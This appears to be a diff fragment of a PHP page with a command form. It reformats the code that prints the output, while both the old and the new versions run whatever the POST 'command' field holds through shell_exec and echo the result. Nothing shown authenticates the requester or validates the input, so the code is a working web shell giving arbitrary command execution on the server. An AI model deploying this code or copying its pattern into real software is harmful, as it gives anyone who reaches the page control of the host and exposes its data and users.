@@ -80,13 +80,16 @@
         </form>
     </div>
 
-    <pre><?php
-        if ($_SERVER["REQUEST_METHOD"] === "POST") {
-            $command = $_POST["command"] ?? "";
-            $output = shell_exec($command);
-            echo htmlspecialchars($output ?? "", ENT_QUOTES, "UTF-8");
-        }
-    ?></pre>
+    <?php
+    if ($_SERVER["REQUEST_METHOD"] === "POST") {
+        $command = $_POST["command"] ?? "";
+        $output = shell_exec($command);
+
+        echo "<pre>" .
+             htmlspecialchars($output ?? "", ENT_QUOTES, "UTF-8") .
+             "</pre>";
+    }
+    ?>
 
     <script>
         function showCommandBox() {
